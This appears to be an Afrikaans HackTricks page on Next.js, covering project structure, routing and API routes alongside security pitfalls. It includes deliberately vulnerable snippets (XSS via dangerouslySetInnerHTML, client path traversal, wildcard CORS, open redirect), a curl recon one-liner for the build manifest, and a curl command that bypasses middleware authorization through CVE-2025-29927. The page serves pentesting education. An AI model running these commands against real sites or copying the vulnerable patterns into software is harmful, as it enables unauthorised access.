# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Algemene argitektuur van 'n Next.js-toepassing

### Tipiese lêerstruktuur

'n Standaard Next.js-projek volg 'n spesifieke lêer- en gidsstruktuur wat funksies soos routing, API-eindpunte en bestuur van statiese hulpbronne fasiliteer. Hier is 'n tipiese uitleg:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Kern Gidse en Lêers

- **public/:** Huisves statiese bates soos beelde, lettertipes en ander lêers. Lêers hier is toeganklik by die root-pad (`/`).
- **app/:** Sentrale gids vir jou toepassing se bladsye, uitleg, komponente en API-roetes. Omhels die App Router-paradigma, wat gevorderde routing-funksies en skeiding tussen server- en kliëntkomponente moontlik maak.
- **app/layout.tsx:** Definieer die root-uitleg vir jou toepassing, wat om alle bladsye draai en konsekwente UI-elemente soos headers, voetteks en navigasiebalkies verskaf.
- **app/page.tsx:** Bedien as die toegangspunt vir die wortelroete `/`, en render die tuisblad.
- **app/[route]/page.tsx:** Hanteer statiese en dinamiese roetes. Elke gids binne `app/` verteenwoordig 'n roete-segment, en `page.tsx` binne daardie gidse ooreenstem met die roete se komponent.
- **app/api/:** Bevat API-roetes, wat jou toelaat om serverlose funksies te skep wat HTTP-versoeke hanteer. Hierdie roetes vervang die tradisionele `pages/api` gids.
- **app/components/:** Huisves herbruikbare React-komponente wat oor verskillende bladsye en uitleg gebruik kan word.
- **app/styles/:** Bevat globale CSS-lêers en CSS Modules vir komponent-spesifieke stilering.
- **app/utils/:** Sluit nutsfunksies, hulpmodule en ander nie-UI logika in wat oor die toepassing gedeel kan word.
- **.env.local:** Stoor omgewingsveranderlikes wat spesifiek vir die plaaslike ontwikkelingsomgewing is. Hierdie veranderlikes word nie in weergawebeheer opgeneem nie.
- **next.config.js:** Pas Next.js-gedrag aan, insluitend webpack-konfigurasies, omgewingsveranderlikes en sekuriteitsinstellings.
- **tsconfig.json:** Konfigureer TypeScript-instellings vir die projek, wat tipekontrole en ander TypeScript-funksies moontlik maak.
- **package.json:** Beheer projek-afhanklikhede, skripte en metadata.
- **README.md:** Verskaf dokumentasie en inligting oor die projek, insluitend opstellingsinstruksies, gebruiksriglyne en ander relevante besonderhede.
- **yarn.lock / package-lock.json:** Sluit die projek se afhanklikhede vas by spesifieke weergawes om konsekwente installasies oor verskillende omgewings te verseker.

## Kliëntkant in Next.js

### Lêer-gebaseerde Routing in die `app` Gids

Die `app` gids is die hoeksteen van routing in die nuutste Next.js-weergawes. Dit gebruik die lêerstelsel om roetes te definieer, wat roete-bestuur intuïtief en skaalbaar maak.

<details>

<summary>Hantering van die Wortelpad /</summary>

**Lêerstruktuur:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Belangrike lêers:**

- **`app/page.tsx`**: Hanteer versoeke na die wortelpad `/`.
- **`app/layout.tsx`**: Bepaal die uitleg vir die toepassing en omsluit alle bladsye.

**Implementering:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Verduideliking:**

- **Roete-definisie:** Die `page.tsx`-lêer direk in die `app`-gids ooreenstem met die `/`-roete.
- **Weergawing:** Hierdie komponent toon die inhoud vir die tuisblad.
- **Layout-integrasie:** Die `HomePage`-komponent word deur die `layout.tsx` omhul, wat headers, footers, en ander algemene elemente kan insluit.

</details>

<details>

<summary>Hantering van Ander Statiese Paaie</summary>

**Voorbeeld: `/about`-roete**

**Lêerstruktuur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Verduideliking:**

- **Roete-definisie:** Die `page.tsx` file inside the `about` folder corresponds to the `/about` route.
- **Weergawing:** Hierdie komponent toon die inhoud vir die about-bladsy.

</details>

<details>

<summary>Dinamiese roetes</summary>

Dinamiese roetes laat die hantering van paaie met veranderlike segmente toe, wat toepassings in staat stel om inhoud te vertoon gebaseer op parameters soos IDs, slugs, ens.

**Voorbeeld: `/posts/[id]`-roete**

**Lêerstruktuur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Verduideliking:**

- **Dinamiese segment:** `[id]` dui 'n dinamiese segment in die roete aan, wat die `id` parameter uit die URL vang.
- **Toegang tot parameters:** Die `params`-objek bevat die dinamiese parameters, en is binne die komponent toeganklik.
- **Roete-ooreenkoms:** Enige pad wat ooreenstem met `/posts/*`, soos `/posts/1`, `/posts/abc`, ens., sal deur hierdie komponent hanteer word.

</details>

<details>

<summary>Geneste roetes</summary>

Next.js ondersteun geneste roetes, wat hiërargiese roetestrukture moontlik maak wat die gidsindeling weerspieël.

**Voorbeeld: `/dashboard/settings/profile` Roete**

**Lêerstruktuur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Verduideliking:**

- **Deep Nesting:** Die `page.tsx` lêer binne `dashboard/settings/profile/` stem ooreen met die `/dashboard/settings/profile` route.
- **Hierarchy Reflection:** Die gidsstruktuur weerspieël die URL path, wat onderhoudbaarheid en duidelikheid verbeter.

</details>

<details>

<summary>Catch-all-roetes</summary>

Catch-all-roetes hanteer veelvuldige geneste segmente of onbekende paaie, en bied buigsaamheid in roetehantering.

**Voorbeeld: `/*` Route**

**Lêerstruktuur:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Verduideliking:**

- **Catch-All-segment:** `[...slug]` vang alle oorblywende padsegmente as 'n array.
- **Gebruik:** Nuttig vir die hantering van dinamiese roeteringscenario's soos gebruikersgegenereerde paaie, geneste kategorieë, ens.
- **Roete-ooreenkoms:** Paaie soos `/anything/here`, `/foo/bar/baz`, ens., word deur hierdie komponent hanteer.

</details>

### Potensiële kliënt-side kwesbaarhede

Alhoewel Next.js 'n veilige basis bied, kan onvanpaste koderingpraktyke kwesbaarhede inbring. Belangrike kliënt-side kwesbaarhede sluit in:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

XSS-aanvalle gebeur wanneer kwaadwillige skripte in betroubare webwerwe ingespuit word. Aanvallers kan skripte in gebruikers se blaaiers uitvoer, data steel of aksies namens die gebruiker uitvoer.

**Voorbeeld van kwesbare kode:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Waarom dit kwesbaar is:** Die gebruik van `dangerouslySetInnerHTML` met onbetroubare invoer laat attackers toe om malicious scripts te inject.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Dit gebeur wanneer gebruikersinsette verkeerd hanteer word in templates, wat attackers toelaat om templates of expressions te inject en uit te voer.

**Voorbeeld van kwesbare kode:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Waarom dit kwesbaar is:** As `template` of `data` kwaadwillige inhoud bevat, kan dit lei tot die uitvoering van onbedoelde kode.

</details>

<details>

<summary>Client Path Traversal</summary>

Dit is 'n kwesbaarheid wat aanvallers toelaat om client-side paths te manipuleer om onbedoelde aksies uit te voer, soos Cross-Site Request Forgery (CSRF). Anders as server-side path traversal, wat die server se filesystem teiken, fokus CSPT op die uitbuiting van client-side meganismes om geldige API-aanvrae na kwaadwillige endpoints om te lei.

**Voorbeeld van kwesbare kode:**

'n Next.js application laat gebruikers toe om lêers op te laai en af te laai. Die aflaaifunksie is op die client side geïmplementeer, waar gebruikers die lêerpad wat afgelaai moet word, kan spesifiseer.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Aanvalscenario

1. **Aanvaller se doelwit**: Voer 'n CSRF-aanval uit om 'n kritiese lêer (bv., `admin/config.json`) te verwyder deur die `filePath` te manipuleer.
2. **Uitbuiting van CSPT**:
- **Kwaadaardige invoer**: Die aanvaller skep 'n URL met 'n gemanipuleerde `filePath` soos `../deleteFile/config.json`.
- **Resulterende API-oproep**: Die client-side kode maak 'n versoek na `/api/files/../deleteFile/config.json`.
- **Server se hantering**: As die server die `filePath` nie valideer nie, verwerk dit die versoek en kan dit moontlik sensitiewe lêers uitvee of blootstel.
3. **Uitvoering van CSRF**:
- **Gemaakte skakel**: Die aanvaller stuur die slagoffer 'n skakel of embed 'n kwaadaardige script wat die aflaa versoek met die gemanipuleerde `filePath` veroorsaak.
- **Uitkoms**: Die slagoffer voer onbewustelik die aksie uit, wat lei tot onbevoegde lêertoegang of -verwydering.

#### Waarom dit kwesbaar is

- **Gebrek aan validasie van invoer**: Die client-side laat arbitrêre `filePath` invoer toe, wat padtraversal moontlik maak.
- **Vertrou kliëntinsette**: Die server-side API vertrou en verwerk die `filePath` sonder sanitisasie.
- **Potensiële API-aksies**: As die API-endpoint staat-wysigende aksies uitvoer (bv., verwyder, wysig lêers), kan dit via CSPT uitgebuit word.

</details>

### Herkenning: statiese export-roete-ontdekking via _buildManifest

Wanneer `nextExport`/`autoExport` waar is (statiese export), Next.js openbaar die `buildId` in die HTML en bedien 'n build manifest by `/_next/static/<buildId>/_buildManifest.js`. Die `sortedPages` array en route→chunk mapping daar som elke vooraf-gerenderde bladsy op sonder brute force.

- Kry die buildId uit die wortelrespons (dikwels onderaan sigbaar) of uit `<script>` tags wat `/_next/static/<buildId>/...` laai.
- Haal die manifest op en onttrek roetes:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Gebruik die ontdekte paaie (byvoorbeeld `/docs`, `/docs/content/examples`, `/signin`) om auth testing en endpoint discovery aan te dryf.

## Bedienerkant in Next.js

### Bedienerkant-rendering (SSR)

Bladsye word op die bediener by elke versoek gerender, wat verseker dat die gebruiker volgerenderde HTML ontvang. In hierdie geval moet jy jou eie aangepaste bediener skep om die versoeke te verwerk.

**Gebruiksgvalle:**

- Dinamiese inhoud wat gereeld verander.
- SEO-optimalisering, aangesien soekenjins die volgerenderde bladsy kan deursoek.

**Implementering:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Statiese Webwerf Generering (SSG)

Bladsye word tydens die build vooraf gerender, wat lei tot vinniger laaitye en verminderde bedienerbelasting.

**Gebruiksgevalle:**

- Inhoud wat nie gereeld verander nie.
- Blogs, dokumentasie, bemarkingsbladsye.

**Implementering:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Serverless Funksies (API Routes)

Next.js maak die skep van API-endpunte as serverless funksies moontlik. Hierdie funksies word op aanvraag uitgevoer sonder die behoefte aan 'n toegewyde bediener.

**Gebruikstoepassings:**

- Behandeling van vormindienings.
- Interaksie met databases.
- Verwerking van data of integrasie met APIs van derdepartye.

**Implementering:**

Met die bekendstelling van die `app` directory in Next.js 13 het routering en API-hantering meer buigsaam en kragtig geword. Hierdie moderne benadering stem nou baie ooreen met die lêer-gebaseerde routingstelsel, maar stel verbeterde vermoëns bekend, insluitend ondersteuning vir server- en client-komponente.

#### Basiese Roete-hanteraar

**File Structure:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Implementering:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Verduideliking:**

- **Ligging:** API routes word geplaas onder die `app/api/` directory.
- **Lêerbenaming:** Elke API-endpoint woon in sy eie vouer wat 'n `route.js` of `route.ts`-lêer bevat.
- **Uitgevoerde funksies:** In plaas van 'n enkele default export, word spesifieke HTTP-metode funksies (bv. `GET`, `POST`) uitgevoer.
- **Response Handling:** Gebruik die `Response` constructor om responses terug te gee, wat meer beheer oor headers en statuskodes moontlik maak.

#### Hoe om ander paaie en metodes te hanteer:

<details>

<summary>Hantering van spesifieke HTTP-metodes</summary>

Next.js 13+ laat jou toe om handlers vir spesifieke HTTP-metodes binne dieselfde `route.js` of `route.ts`-lêer te definieer, wat duideliker en meer georganiseerde kode bevorder.

**Voorbeeld:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Verduideliking:**

- **Meerdere Exporte:** Elke HTTP-metode (`GET`, `PUT`, `DELETE`) het sy eie geëksporteerde funksie.
- **Parameters:** Die tweede argument bied toegang tot route-parameters via `params`.
- **Verbeterde response-objekte:** Groter beheer oor response-objekte, wat presiese header- en statuskodebeheer moontlik maak.

</details>

<details>

<summary>Catch-All en Geneste Roetes</summary>

Next.js 13+ ondersteun gevorderde routing-funksies soos catch-all roetes en geneste API-roetes, wat meer dinamiese en skaalbare API-strukture moontlik maak.

**Catch-All Roete Voorbeeld:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Verduideliking:**

- **Sintaksis:** `[...]` dui 'n vang-alles-segment aan wat alle geneste paaie vasvang.
- **Gebruik:** Nutig vir APIs wat wisselende roete-diepte of dinamiese segmente moet hanteer.

**Geneste Roetes Voorbeeld:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Verduideliking:**

- **Deep Nesting:** Laat hiërargiese API-strukture toe wat hulpbronverhoudings weerspieël.
- **Parameter Access:** Gee maklike toegang tot meerdere roeteparameters via die `params` object.

</details>

<details>

<summary>Hantering van API-roetes in Next.js 12 en vroeër</summary>

## API-roetes in die `pages` Directory (Next.js 12 en vroeër)

Voordat Next.js 13 die `app` directory en verbeterde routing-vaardighede bekendgestel het, is API-roetes hoofsaaklik binne die `pages` directory gedefinieer. Hierdie benadering word steeds wyd gebruik en ondersteun in Next.js 12 en vroeër.

#### Basiese API-roete

**Lêerstruktuur:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Implementering:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Verduideliking:**

- **Ligging:** API routes lê onder die `pages/api/` gids.
- **Export:** Gebruik `export default` om die handler-funksie te definieer.
- **Funksiehandtekening:** Die handler ontvang `req` (HTTP request) en `res` (HTTP response) objekte.
- **Routering:** Die lêernaam (`hello.js`) kaarteer na die endpoint `/api/hello`.

#### Dinamiese API-roetes

**Lêerstruktuur:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Implementering:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Verduideliking:**

- **Dinamiese segmente:** Vierkantige hakies (`[id].js`) dui dinamiese roetesegmente aan.
- **Toegang tot parameters:** Gebruik `req.query.id` om die dinamiese parameter te kry.
- **Hantering van metodes:** Gebruik voorwaardelike logika om verskillende HTTP-metodes (`GET`, `PUT`, `DELETE`, etc.) te hanteer.

#### Hantering van verskillende HTTP-metodes

Alhoewel die basiese API-route voorbeeld alle HTTP-metodes binne 'n enkele funksie hanteer, kan jy jou kode struktureer om elke metode eksplisiet te hanteer vir beter duidelikheid en onderhoudbaarheid.

**Voorbeeld:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Beste praktyke:**

- **Skeiding van verantwoordelikhede:** Skeid die logika duidelik vir verskillende HTTP-metodes.
- **Konsekwentheid van respons:** Verseker konsekwente responsstrukture vir maklike kliëntkant-hantering.
- **Foutbehandeling:** Hanteer nie-ondersteunde metodes en onverwagte foute netjies.

</details>

### CORS-konfigurasie

Beheer watter oorspronge toegang tot jou API-roetes kan kry, en verminder Cross-Origin Resource Sharing (CORS)-kwesbaarhede.

**Slegte Konfigurasie Voorbeeld:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Let op dat **CORS ook in al die API routes gekonfigureer kan word** binne die **`middleware.ts`**-lêer:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Problem:**

- **`Access-Control-Allow-Origin: '*'`:** Laat enige webwerf toe om toegang tot die API te kry, wat moontlik kwaadwillige werwe in staat stel om sonder beperkings met jou API te interaksioneer.
- **Wide Method Allowance:** Om alle metodes toe te laat kan aanvallers in staat stel om ongewenste handelinge uit te voer.

**How attackers exploit it:**

Aanvallers kan kwaadwillige webwerwe skep wat versoeke na jou API maak, en moontlik funksionaliteit misbruik soos data-ophaling, data-manipulasie, of die veroorsaak van ongewenste handelinge namens geauthentiseerde gebruikers.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Server code exposure in Client Side

Dit kan maklik gebeur dat kode wat deur die bediener gebruik word ook in kode wat aan die kliëntkant blootgestel en gebruik word, verskyn. Die beste manier om te verseker dat 'n kode-lêer nooit aan die kliëntkant blootgestel word nie, is deur hierdie import aan die begin van die lêer te gebruik:
```js
import "server-only"
```
## Sleutel-lêers en hul rolle

### `middleware.ts` / `middleware.js`

**Ligging:** Wortel van die projek of binne `src/`.

**Doel:** Voer kode uit in die server-side serverless funksie voordat ’n versoek verwerk word, wat take soos authentication, redirects, of die wysiging van responses toelaat.

**Uitvoeringsvloei:**

1. **Inkomende versoek:** Die middleware onderskep die versoek.
2. **Verwerking:** Voer operasies uit gebaseer op die versoek (bv. check authentication).
3. **Response-wysiging:** Kan die response verander of beheer aan die volgende handler oordra.

**Voorbeelde van gebruiksgevalle:**

- Redirecting unauthenticated users.
- Adding custom headers.
- Logging requests.

**Voorbeeldkonfigurasie:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

As autorisasie in middleware afgedwing word, kan geraakte Next.js-releases (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) omseil word deur die `x-middleware-subrequest` header in te voeg. Die framework sal middleware-rekursie oorslaan en die beskermde bladsy terugstuur.

- Basiese gedrag is gewoonlik 'n 307-omleiding na 'n login-roete soos `/api/auth/signin`.
- Stuur 'n lang `x-middleware-subrequest`-waarde (herhaal `middleware` om `MAX_RECURSION_DEPTH` te tref) om die response na 200 te draai:
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- Omdat geverifieerde bladsye baie subbronne laai, voeg die header by elke versoek (bv. Burp Match/Replace met 'n leë match string) om te verhoed dat assets herlei word.

### `next.config.js`

**Location:** Wortel van die projek.

**Purpose:** Konfigureer Next.js-gedrag, skakel funksies aan of af, pas webpack-konfigurasies aan, stel omgewingsveranderlikes in, en konfigureer verskeie sekuriteitsfunksies.

**Key Security Configurations:**

<details>

<summary>Sekuriteitsheaders</summary>

Sekuriteitsheaders verbeter die sekuriteit van jou aansoek deur blaaiers te instrueer oor hoe om inhoud te hanteer. Hulle help om verskeie aanvalle te verminder, soos Cross-Site Scripting (XSS), Clickjacking, en MIME-type sniffing:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Voorbeelde:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Beeldoptimaliseringsinstellings</summary>

Next.js optimaliseer beelde vir prestasie, maar verkeerde konfigurasies kan lei tot sekuriteitskwesbaarhede, soos dat onbetroubare bronne kwaadwillige inhoud kan inspuit.

**Voorbeeld van 'n slegte konfigurasie:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Probleem:**

- **`'*'`:** Laat toe dat beelde vanaf enige eksterne bron gelaai word, insluitend onbetroubare of kwaadwillige domeine. Aanvallers kan beelde host wat kwaadwillige payloads bevat of inhoud wat gebruikers mislei.
- Nog 'n probleem kan wees om 'n domein toe te laat **waar enigiemand 'n beeld kan oplaai** (soos `raw.githubusercontent.com`)

**Hoe aanvallers dit misbruik:**

Deur beelde van kwaadwillige bronne in te sluit, kan aanvallers phishing attacks uitvoer, misleidende inligting vertoon, of exploit vulnerabilities in image rendering libraries.

</details>

<details>

<summary>Blootstelling van omgewingsveranderlikes</summary>

Hanteer sensitiewe inligting soos API keys en database credentials veilig sonder om dit aan die kliënt bloot te stel.

#### a. Blootstelling van sensitiewe veranderlikes

**Slegte Konfigurasie Voorbeeld:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for client
},
}
```
**Probleem:**

- **`SECRET_API_KEY`:** Sonder die `NEXT_PUBLIC_` voorvoegsel openbaar Next.js veranderlikes nie aan die kliënt nie. As dit egter per ongeluk met die voorvoegsel (bv. `NEXT_PUBLIC_SECRET_API_KEY`) gegee word, raak dit op die kliënt se kant toeganklik.

**Hoe aanvallers dit misbruik:**

As sensitiewe veranderlikes aan die kliënt blootgestel word, kan aanvallers dit terugkry deur die kliëntzijde-kode of netwerkversoeke te inspekteer, en sodoende ongemagtigde toegang tot APIs, databasisse of ander dienste verkry.

</details>

<details>

<summary>Omleidings</summary>

Beheer URL-omleidings en -herskrywings binne jou toepassing en verseker dat gebruikers behoorlik gerig word sonder om open redirect vulnerabilities in te bring.

#### a. Open Redirect Vulnerability

**Slegte Konfigurasie Voorbeeld:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Probleem:**

- **Dynamic Destination:** Laat gebruikers toe om enige URL te spesifiseer, wat open redirect-aanvalle moontlik maak.
- **Trusting User Input:** Omleidings na URLs wat deur gebruikers verskaf word sonder validering kan lei tot phishing, malware distribution, of credential theft.

**Hoe aanvallers dit misbruik:**

Aanvallers kan URLs opstel wat lyk asof dit van jou domein afkomstig is, maar gebruikers na kwaadwillige webwerwe herlei. Byvoorbeeld:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Gebruikers wat die oorspronklike domein vertrou, kan onbewustelik na skadelike webwerwe navigeer.

</details>

<details>

<summary>Webpack Configuration</summary>

Pas Webpack-konfigurasies vir jou Next.js-toepassing aan, wat onbedoeld sekuriteitskwesbaarhede kan inbring as dit nie versigtig hanteer word nie.

#### a. Blootstelling van sensitiewe modules

**Slegte konfigurasie-voorbeeld:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Problem:**

- **Blootstelling van sensitiewe paaie:** Aliasing van sensitiewe directories en die toelaat van client-side toegang kan leak vertroulike inligting.
- **Geheime bundeling:** As sensitiewe lêers vir die client gebundel word, word hul inhoud toeganklik via source maps of deur die client-side code te inspekteer.

Hoe aanvallers dit misbruik:

Aanvallers kan toegang kry tot of die toepassing se gidsstruktuur herbou, en moontlik sensitiewe lêers of data vind en benut.

</details>

### `pages/_app.js` and `pages/_document.js`

#### **`pages/_app.js`**

**Doel:** Oorskryf die standaard App component, wat globale state, styles en layout-komponente moontlik maak.

**Gebruikstoepassings:**

- Invoeg van globale CSS.
- Byvoeg van layout-wrappers.
- Integrasie van state management libraries.

**Voorbeeld:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Doel:** Oorskryf die verstek Document, en stel aanpassing van die `<html>` en `<body>`-tags in staat.

**Gebruikgevalle:**

